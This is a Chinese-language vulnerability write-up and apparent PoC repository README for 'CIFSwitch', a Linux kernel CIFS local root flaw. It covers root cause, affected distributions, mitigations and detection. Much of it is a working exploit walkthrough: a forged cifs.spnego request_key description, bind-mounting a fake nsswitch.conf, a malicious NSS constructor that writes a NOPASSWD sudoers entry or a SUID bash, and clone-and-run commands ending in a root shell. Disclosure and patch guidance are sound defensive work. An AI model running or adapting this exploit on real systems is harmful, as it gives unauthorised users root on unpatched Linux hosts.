# QVD-2026-29453 — CIFSwitch

> **Linux Kernel CIFS 本地权限提升 | CVSS 3.1: 7.8 HIGH | cifs.spnego 来源校验缺失 | 非普遍性漏洞 | PoC / EXP 已公开** | [复现方法](#复现步骤)
>
> 这条链很阴。问题不是 `cifs.upcall` 自己想作恶，而是内核把一个本该只由 CIFS 客户端生成的 `cifs.spnego` 请求入口，留给了本地用户伪造。  
> 于是，一个低权限用户可以让 root 权限的 `cifs.upcall` 走进自己布置好的 mount namespace，读自己的 `nsswitch.conf`，加载自己的 `libnss_*.so.2`。然后 sudoers 就被写进去了。
>
> 但要注意，作者原文明确强调这是 **non-universal** 的本地提权：能不能打通，取决于内核版本、`cifs-utils`、未授权命名空间与默认策略是否同时满足。

---

## 漏洞速览

| 项目 | 内容 |
|------|------|
| **漏洞编号** | QVD-2026-29453 |
| **漏洞代号** | CIFSwitch（作者原文定性为 **non-universal Linux local root vulnerability**） |
| **漏洞类型** | 本地权限提升 (LPE)，且属于非普遍性漏洞，强依赖具体发行版与配置组合 |
| **CVSS 3.1** | 7.8 HIGH（奇安信通告口径） |
| **影响组件** | Linux Kernel CIFS / SMB client、`cifs.spnego` key type、`cifs.upcall` |
| **根因类型** | 缺少 `vet_description` 来源校验，信任用户态伪造的 `cifs.spnego` description |
| **上游补丁** | `3da1fdf4efbc490041eb4f836bf596201203f8f2` (`smb: client: reject userspace cifs.spnego descriptions`) |
| **发现方** | Asim Manizada（公开披露 / PoC） |
| **披露日期** | 作者原文发布于 2026-05-27；2026-05-29 多家厂商通告跟进 |
| **利用条件** | 本地低权限用户 + `cifs-utils` / `cifs.upcall` + `cifs.spnego` request-key 规则 + 非特权 user/mount namespace 可用 |
| **在野利用** | 奇安信通告口径：暂未发现 |
| **仓库 PoC** | [`exploit/exp.py`](exploit/exp.py) |

---

## 受影响范围

### 内核与组件

公开通告中给出的核心判断标准：

```text
Linux Kernel commit < 3da1fdf4efbc490041eb4f836bf596201203f8f2
```

也就是上游补丁合入前，缺少 `cifs.spnego` description 来源校验的内核均可能受影响。

但这个漏洞能不能打通，不只看内核版本，还要看用户态与系统策略。

| 条件 | 说明 |
|------|------|
| Kernel CIFS 支持 | `cifs` 文件系统已注册、可加载或内置 |
| `cifs-utils` | 需要存在 `cifs.upcall`，公开通告重点提到 `cifs-utils >= 6.14`；作者原文额外强调，其他 CVE 的 backport 可能把问题带回旧版 `cifs-utils`，因此不能只机械看主版本 |
| request-key 规则 | `/etc/request-key.conf` 或 `/etc/request-key.d/` 中存在 `cifs.spnego` → `cifs.upcall` 规则 |
| 用户命名空间 | 非特权用户可创建 user namespace / mount namespace |
| LSM 策略 | AppArmor / SELinux 没有阻断该利用路径 |

### 已知受影响发行版

根据奇安信 / 腾讯云转述通告，已知受影响环境包括：

| 发行版 / 环境 | 说明 |
|---------------|------|
| Linux Mint 21.3 / 22.3 | Cinnamon 环境 |
| CentOS Stream 9 | GNOME 环境 |
| Rocky Linux 9 | Workstation 环境 |
| Kali Linux 2021.4 / 2022.4 / 2023.4 / 2024.4 / 2025.4 / 2026.1 | headless 环境 |
| AlmaLinux 9.7 | Workstation / Azure cloud image |
| SUSE Linux Enterprise Server 15 SP7 | 已列入受影响环境 |
| SLES SAP 15 SP7 | 已列入受影响环境 |
| SLES SAP 16 | 已列入受影响环境 |

CloudLinux 文章还指出：CloudLinux 7h / 8 / 9 / 10 等环境在安装 `cifs-utils` 且允许非特权 user namespace 时存在暴露风险；CloudLinux 7 默认 `user.max_user_namespaces=0`，默认配置下不暴露。

### 已知不受影响或默认阻断场景

| 场景 | 原因 |
|------|------|
| 未安装 `cifs-utils` | 没有 `cifs.upcall`，默认链条缺一环 |
| 没有 `cifs.spnego` request-key 规则 | 伪造请求无法调起 `cifs.upcall` |
| 禁用非特权 user namespace | 攻击者无法准备可控 user/mount namespace |
| SELinux / AppArmor 默认阻断 | LSM 策略拦截 namespace 或 helper 行为 |
| `cifs-utils < 6.14` | 常见口径认为旧版本通常不受影响，但作者原文指出：部分旧版因 backport 其他 CVE 修复，也可能引入相关路径，因此不能一刀切 |

> **注意**：发行版回补策略可能不同。最终判断应以发行版安全公告、内核补丁状态和本机实际配置为准。

---

## 根因分析

这个洞的核心不是传统意义上的内存破坏。

它更像一个身份混淆漏洞：root 权限 helper 以为自己在处理内核发来的 CIFS 认证请求，实际上请求描述是本地低权限用户手搓出来的。

### 第一层：`cifs.spnego` description 本应只来自内核

CIFS / SMB 客户端在处理 Kerberos / SPNEGO 认证时，会通过 Linux key retention service 请求用户态 helper 生成认证材料。

典型链路是：

```text
Linux CIFS client
  → request_key("cifs.spnego", description, ...)
  → /sbin/request-key
  → cifs.upcall
  → 返回 SPNEGO / Kerberos 认证数据
```

`description` 里包含一串对 `cifs.upcall` 有意义的字段，例如：

```text
ver=0x2;host=...;ip4=...;sec=krb5;uid=...;creduid=...;pid=...;upcall_target=...;user=...
```

这些字段会影响 `cifs.upcall` 后续行为：

| 字段 | 作用 |
|------|------|
| `pid` | 指向某个进程，`cifs.upcall` 可能据此进入该进程 namespace |
| `uid` / `creduid` | 表示请求发起者或凭据用户 |
| `upcall_target` | 影响 upcall 目标，公开 PoC 使用 `app` |
| `user` | 触发用户解析流程，后续进入 NSS 查询 |

设计上，`cifs.upcall` 默认相信这些字段来自内核 CIFS 模块。

问题是，内核没有强制保证这一点。

### 第二层：缺少 `vet_description` 校验

Linux key type 可以实现 `.vet_description` 钩子，用于验证 key description 是否可信、是否符合来源约束。

CIFSwitch 的根因就在这里：

```text
cifs_spnego_key_type 缺少 vet_description
```

结果是，本地低权限用户也能直接调用：

```text
request_key("cifs.spnego", forged_description, "", KEY_SPEC_SESSION_KEYRING)
```

内核无法区分：

```text
真正的 CIFS 内核模块请求
vs
本地用户伪造的 cifs.spnego 请求
```

这一下，权限边界就被打穿了。

### 第三层：root 权限 `cifs.upcall` 信任可控字段

系统里的 request-key 规则通常会把 `cifs.spnego` 请求交给 `cifs.upcall`：

```text
create cifs.spnego * * /usr/sbin/cifs.upcall ...
```

`cifs.upcall` 是为了帮内核完成 CIFS 认证而存在的用户态 helper，通常以 root 权限运行。

当攻击者能伪造 description 时，就可以诱导 root 权限的 `cifs.upcall`：

1. 读取攻击者控制的 `pid`
2. 根据 `upcall_target=app` 等字段进入对应进程 namespace
3. 在降权之前调用 `getpwuid()` 等 NSS 查询函数
4. 在攻击者控制的 mount namespace 中读取伪造的 `/etc/nsswitch.conf`
5. 加载攻击者提供的 `libnss_pwn.so.2`

NSS 模块一旦被 root 进程加载，构造函数就能执行。

这就是整个漏洞的爆点。

### 第四层：namespace + NSS 把「配置劫持」变成 root 代码执行

NSS（Name Service Switch）本来是 Linux 查询用户、组、主机名等信息的机制。

比如 `getpwuid(0)` 会根据 `/etc/nsswitch.conf` 决定从哪里查用户信息：

```text
passwd: files systemd
```

如果攻击者能在自己的 mount namespace 里把 `/etc/nsswitch.conf` 换成：

```text
passwd: pwn files
```

并且把 NSS 模块目录绑定到自己可控的 `fakelib`，那么 root 权限进程调用 `getpwuid()` 时，就会尝试加载：

```text
libnss_pwn.so.2
```

PoC 正是利用这一点，在恶意 NSS 模块 constructor 里写入 sudoers 或创建 fallback SUID shell。

---

## 利用机制

### 攻击链路

```text
本地低权限用户
  → 创建 user namespace + mount namespace
  → 准备伪造 /etc/nsswitch.conf
  → 准备恶意 libnss_pwn.so.2
  → bind mount 覆盖 NSS 配置与 NSS 模块目录
  → 构造 forged cifs.spnego description
  → request_key("cifs.spnego", forged_description, ...)
  → /sbin/request-key 触发 cifs.upcall
  → cifs.upcall 以 root 权限进入攻击者 namespace
  → 降权前调用 getpwuid()
  → glibc NSS 加载 libnss_pwn.so.2
  → constructor 写入 /etc/sudoers.d/ 或创建 SUID root shell
  → 原进程 sudo -n /bin/bash -p 获得 root shell
```

### PoC 分析 (`exploit/exp.py`)

本仓库 PoC 是一个完整的自动化利用脚本。它会在 `/tmp` 下生成临时工作目录，编译两个 C 程序 / 共享库，然后触发 `cifs.upcall`。

关键路径：

```python
WORKDIR = Path("/tmp") / ("cifs-upcall-sudoers-poc-%s" % RUN_TOKEN)
FAKELIB_DIR = WORKDIR / "fakelib"
FAKE_NSSWITCH = WORKDIR / "nsswitch.conf"
EVIDENCE_LOG = Path("/tmp/cifs_upcall_sudoers_evidence_%s.txt" % RUN_TOKEN)
ROOT_SHELL = Path("/var/tmp/cifs_upcall_rootsh_%s" % RUN_TOKEN)
```

#### 步骤 1：生成恶意 NSS 模块

`LIBNSS_SOURCE` 会被写成 `libnss_pwn.c`，并编译为：

```text
fakelib/libnss_pwn.so.2
```

核心逻辑在 constructor：

```c
__attribute__((constructor))
static void pwn_constructor(void)
{
    ...
    open(SUDOERS_PATH, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0440);
    dprintf(sudoers_fd, "%s ALL=(ALL:ALL) NOPASSWD: ALL\n", SUDOERS_USER);
    ...
}
```

也就是说，只要这个 NSS 模块被 root 权限进程加载，就会尝试写入：

```text
/etc/sudoers.d/cifs-upcall-poc-<uid>_<pid>
```

让当前用户获得免密 sudo。

#### 步骤 2：准备 fallback root shell

如果直接写 sudoers 失败，PoC 会走备用路径：

```c
create_fallback_root_shell(logfd)
```

它会复制 `/bin/bash` 到：

```text
/var/tmp/cifs_upcall_rootsh_<uid>_<pid>
```

并尝试设置：

```text
owner: root:root
mode: 04755
```

随后脚本会用这个 SUID shell 再补写 sudoers。

#### 步骤 3：伪造 nsswitch 配置

PoC 生成的 `nsswitch.conf` 非常短：

```text
passwd: pwn files
group: files
shadow: files
hosts: files dns
```

关键就是第一行：

```text
passwd: pwn files
```

它让 glibc 在解析用户信息时优先加载 `libnss_pwn.so.2`。

#### 步骤 4：构造触发器

`TRIGGER_SOURCE` 会被编译成 `trigger`，负责进入 namespace、绑定配置、触发 key request。

它先加入一个 session keyring：

```c
keyctl(KEYCTL_JOIN_SESSION_KEYRING, "cifs-upcall-sudoers-poc", ...)
```

再把 mount namespace 设为 private：

```c
mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL)
```

然后尝试自动加载 CIFS：

```c
mount -t cifs //127.0.0.1/share <tmpdir> -o guest,vers=3.0
```

这一步不要求挂载成功，它主要是为了让内核加载 / 注册 CIFS 文件系统路径。

#### 步骤 5：隐藏 NSS 缓存

PoC 会尝试 mask nscd 运行时目录：

```c
mask_dir_if_present("/run/nscd");
mask_dir_if_present("/var/run/nscd");
```

原因是部分系统（例如 SLES）可能启用 nscd 缓存 passwd/group。把 socket 藏起来后，`getpwuid(0)` 更可能走本地 `nsswitch.conf` 和恶意 NSS 模块。

#### 步骤 6：bind mount 覆盖 NSS 配置与模块目录

触发器会把伪造的 nsswitch 配置绑定到：

```text
/etc/nsswitch.conf
/usr/etc/nsswitch.conf
```

然后把攻击者的 `fakelib` 目录绑定到系统 NSS 模块目录，例如：

```text
/usr/lib64
/lib64
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu
```

这些目录由 Python 侧自动探测：

```python
detect_nss_lib_dirs()
```

判断标准是目录里存在：

```text
libnss_files.so.2
```

#### 步骤 7：伪造 `cifs.spnego` description

触发点是：

```c
request_key("cifs.spnego", desc, "", KEY_SPEC_SESSION_KEYRING)
```

PoC 构造的 description：

```text
ver=0x2;host=example.com;ip4=127.0.0.1;sec=krb5;uid=0x0;creduid=0x0;pid=<pid>;upcall_target=app;user=root
```

里面最关键的是：

| 字段 | 作用 |
|------|------|
| `pid=<pid>` | 指向攻击者控制 namespace 中的触发进程 |
| `upcall_target=app` | 诱导 `cifs.upcall` 进入 `upcall_target=app` 分支，并按伪造 `pid` 调用 `switch_to_process_ns(arg->pid)` 切到攻击者控制的进程命名空间 |
| `user=root` | 触发 root 用户解析，进入 `getpwuid()` / NSS 路径 |
| `uid=0x0;creduid=0x0` | 伪造 root 相关身份字段，匹配 cifs.upcall 预期格式 |

修复前，内核不会拒绝这个来自用户态的 description。

#### 步骤 8：确认提权并启动 root shell

脚本通过 evidence log 判断恶意 NSS 是否被加载：

```text
attacker NSS loaded by cifs.upcall
wrote sudoers entry: /etc/sudoers.d/cifs-upcall-poc-...
```

最后检查：

```python
sudo -n /bin/bash -p -c "id -u"
```

如果返回 `0`，说明 sudoers 已生效。然后执行：

```text
sudo -n /bin/bash -p
```

获得 root shell。

### 为什么这条链稳定

| 特性 | 说明 |
|------|------|
| 不依赖内核地址 | 没有 KASLR / kernel ROP 需求 |
| 不依赖内存破坏 | 不是 UAF、越界写或 race |
| 利用 root helper | 借系统合法的 `cifs.upcall` 提权 |
| 关键路径可预检 | PoC 会检查 `gcc`、`sudo`、`unshare`、request-key 规则、NSS 目录等 |
| 失败原因较清晰 | evidence log / preflight 会提示缺少 CIFS、LSM 阻断、request-key 规则缺失等 |

它真正依赖的是系统配置：`cifs-utils`、request-key 规则、user namespace、mount namespace、LSM 策略。

---

## 复现步骤

> 仅在你拥有或获得明确授权的测试环境中执行。本 PoC 会尝试写入 `/etc/sudoers.d/`，失败时还可能创建 SUID root shell。测试后务必清理。

### 环境要求

- Linux x86_64
- 本地低权限用户
- Python 3
- `gcc`
- `sudo`
- `unshare`
- `mount`
- `cifs-utils` / `cifs.upcall`
- 可用的非特权 user namespace + mount namespace
- `/tmp` 可执行（不能是 `noexec`）
- `/etc/request-key.conf` 或 `/etc/request-key.d/` 中存在 `cifs.spnego` → `cifs.upcall` 规则

### 快速自查

检查 `cifs.upcall`：

```bash
command -v cifs.upcall && cifs.upcall -V 2>/dev/null
```

检查 request-key 规则：

```bash
grep -R "cifs.spnego" /etc/request-key.conf /etc/request-key.d 2>/dev/null
```

检查用户命名空间：

```bash
unshare -Ur -m true
```

检查发行版限制：

```bash
sysctl user.max_user_namespaces 2>/dev/null
sysctl kernel.unprivileged_userns_clone 2>/dev/null
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
getenforce 2>/dev/null || true
aa-status 2>/dev/null || true
```

检查 CIFS 是否已注册：

```bash
grep -w cifs /proc/filesystems
```

如果没有输出，PoC 会尝试用一次失败的 CIFS mount 自动触发模块加载。

### 方法 1：本仓库快速执行

```bash
git clone https://github.com/Unclecheng-li/poc-lab.git
cd "poc-lab/QVD-2026-29453 CIFSwitch"
python3 exploit/exp.py
```

### 方法 2：直接运行已有目录

```bash
cd "QVD-2026-29453 CIFSwitch"
python3 exploit/exp.py
```

### 预期效果

成功时会看到类似输出：

```text
***PREFLIGHT***
running as uid=1000 gid=1000 user=test

***BUILDING POC***
workdir: /tmp/cifs-upcall-sudoers-poc-1000_12345
sudoers target: /etc/sudoers.d/cifs-upcall-poc-1000_12345

***TRIGGERING CIFS UPCALL***
sent forged cifs.spnego upcall (request_key rc=... errno=...)
attacker NSS loaded by cifs.upcall
wrote sudoers entry: /etc/sudoers.d/cifs-upcall-poc-1000_12345

***SPAWNING ROOT SHELL***
root shell will be launched by this original process in the host namespace.
$ sudo -n /bin/bash -p
# id
uid=0(root) gid=0(root) groups=0(root),...
```

失败时常见原因：

| 报错 / 现象 | 可能原因 |
|-------------|----------|
| `missing required command(s)` | 缺少 `gcc`、`sudo`、`unshare`、`mount` 等依赖 |
| `no active cifs.spnego request-key rule found` | 未安装 `cifs-utils` 或 request-key 规则不存在 |
| `unprivileged user+mount namespaces are unavailable` | user namespace / mount namespace 被禁用或被 LSM 拦截 |
| `cannot execute files from /tmp` | `/tmp` 挂载了 `noexec` |
| `CIFS kernel filesystem is not registered` | `cifs.ko` 未加载，且模块策略阻止自动加载 |
| `cifs.upcall did not load the attacker NSS module` | request-key 规则被禁用、LSM 阻断 helper、或内核已修复 |

### 清理方式

PoC 成功后会打印清理命令，格式类似：

```bash
sudo rm -f /etc/sudoers.d/cifs-upcall-poc-<uid>_<pid> \
  /tmp/cifs_upcall_sudoers_evidence_<uid>_<pid>.txt \
  /var/tmp/cifs_upcall_rootsh_<uid>_<pid>
rm -rf /tmp/cifs-upcall-sudoers-poc-<uid>_<pid>
```

一定要清理。

不然 sudoers 条目或 fallback SUID shell 会继续留在系统里。

---

## 修复方案

### 方案一：升级内核（推荐）

升级到包含上游补丁的内核版本。

上游补丁：

```text
3da1fdf4efbc490041eb4f836bf596201203f8f2
smb: client: reject userspace cifs.spnego descriptions
```

补丁地址：

```text
https://github.com/torvalds/linux/commit/3da1fdf4efbc490041eb4f836bf596201203f8f2
```

修复思路是拒绝用户态伪造的 `cifs.spnego` description，让该 key type 只接受真实内核 CIFS 路径生成的请求。

### 方案二：禁用 `cifs.spnego` request-key callout

如果业务不需要 Kerberos 认证的 SMB / CIFS 挂载，可以覆盖默认规则：

```bash
echo 'create cifs.spnego * * /bin/false' | sudo tee /etc/request-key.d/cifs.spnego.conf
```

或使用 negate 规则：

```bash
echo 'create cifs.spnego * * /usr/sbin/keyctl negate %k 30 %S' | sudo tee /etc/request-key.d/cifs.spnego.conf
```

> **限制**：如果系统需要 Kerberos 认证的 CIFS mount，这个方案可能导致相关挂载失败。

### 方案三：禁用非特权 user namespace

EL / RHEL / CentOS / Rocky / Alma / CloudLinux 系：

```bash
sudo sysctl -w user.max_user_namespaces=0
echo 'user.max_user_namespaces = 0' | sudo tee /etc/sysctl.d/99-cifswitch.conf
```

Debian / Ubuntu 系：

```bash
sudo sysctl -w kernel.unprivileged_userns_clone=0
echo 'kernel.unprivileged_userns_clone = 0' | sudo tee /etc/sysctl.d/99-cifswitch.conf
```

Ubuntu / AppArmor 新策略环境还可关注：

```bash
sysctl kernel.apparmor_restrict_unprivileged_userns
```

> **限制**：禁用 user namespace 可能影响 rootless Docker、Podman、Flatpak、Chromium sandbox、CI sandbox、非特权 `unshare` 等功能。

### 方案四：卸载 `cifs-utils`

如果主机完全不需要 SMB client 功能：

Debian / Ubuntu：

```bash
sudo apt remove --purge cifs-utils
```

RHEL / CentOS / Rocky / Alma：

```bash
sudo yum remove cifs-utils
```

或：

```bash
sudo dnf remove cifs-utils
```

卸载后会移除 `cifs.upcall` 与相关 request-key 规则，直接切断用户态 helper 链路。

### 方案五：禁止加载 CIFS 模块

如果系统完全不需要 CIFS：

```bash
echo 'install cifs /bin/false' | sudo tee /etc/modprobe.d/disable-cifs.conf
```

这会阻断 CIFS 内核模块加载，但也会影响所有 CIFS / SMB 客户端挂载功能。

---

## 检测与排查

### 暴露面检查

```bash
command -v cifs.upcall && cifs.upcall -V 2>/dev/null
ls -l /etc/request-key.d/cifs.spnego.conf 2>/dev/null
grep -R "cifs.upcall" /etc/request-key.conf /etc/request-key.d 2>/dev/null
sysctl user.max_user_namespaces 2>/dev/null
sysctl kernel.unprivileged_userns_clone 2>/dev/null
```

同时满足以下条件时，风险较高：

```text
cifs.upcall 存在
+ cifs.spnego request-key 规则存在
+ 非特权 user namespace 可用
+ 内核未包含 3da1fdf4efbc 修复
+ LSM 未阻断
```

### 入侵痕迹排查

PoC 和同类利用可能留下：

```text
/etc/sudoers.d/cifs-upcall-poc-*
/tmp/cifs_upcall_sudoers_evidence_*.txt
/var/tmp/cifs_upcall_rootsh_*
/tmp/cifs-upcall-sudoers-poc-*/
```

可快速查找：

```bash
sudo ls -la /etc/sudoers.d/ | grep cifs-upcall
ls -la /tmp/ | grep cifs
ls -la /var/tmp/ | grep cifs_upcall_rootsh
```

也建议关注系统日志中是否出现异常 `request-key`、`cifs.upcall`、`unshare`、`mount -t cifs` 失败记录。

---

## 时间线

| 日期 | 事件 |
|------|------|
| 2007 | CIFS / SPNEGO upcall 相关代码路径进入长期存在状态（公开文章口径） |
| 2026-05-27 | 作者 Asim Viladi Oglu Manizada 公开 CIFSwitch 原始技术说明与 PoC |
| 2026-05-29 | 腾讯云、奇安信、CloudLinux 等通告跟进 |
| 2026-05-29 | CloudLinux 发布 CIFSwitch 缓解与内核更新说明 |
| 2026-05-31 | 本仓库根据 Copy Fail README 模板补全文档 |

---

## 参考资料

| 来源 | 链接 |
|------|------|
| 漏洞披露原文 | https://heyitsas.im/posts/cifswitch/ |
| 作者公开 PoC 仓库 | https://github.com/manizada/CIFSwitch |
| 上游 Linux 修复 commit | https://github.com/torvalds/linux/commit/3da1fdf4efbc490041eb4f836bf596201203f8f2 |
| 腾讯云技术通告 | https://cloud.tencent.com/developer/article/2676151 |
| 腾讯云安全公告 | https://cloud.tencent.com/announce/detail/2306 |
| 奇安信 / SecRSS 安全风险通告 | https://www.secrss.com/articles/90796 |
| CloudLinux 缓解与更新说明 | https://blog.cloudlinux.com/cifswitch-mitigation-and-kernel-update |
| 本仓库 PoC | [`exploit/exp.py`](exploit/exp.py) |

- 以上链接最后访问时间：2026-06-01
- 当前公开资料中尚未确认 CVE 编号；本仓库按奇安信 QVD 编号 `QVD-2026-29453` 归档
- 各发行版修复版本请以对应厂商安全公告为准

---

## 免责声明

本项目仅用于授权安全研究、漏洞复现、资产自查与防御验证。

请勿在未授权系统上运行本 PoC。该脚本会尝试写入 `/etc/sudoers.d/`，并在部分路径下创建 SUID root shell。任何未授权测试、提权、持久化或破坏行为均可能违反法律法规。使用者需自行承担由不当使用造成的一切后果。
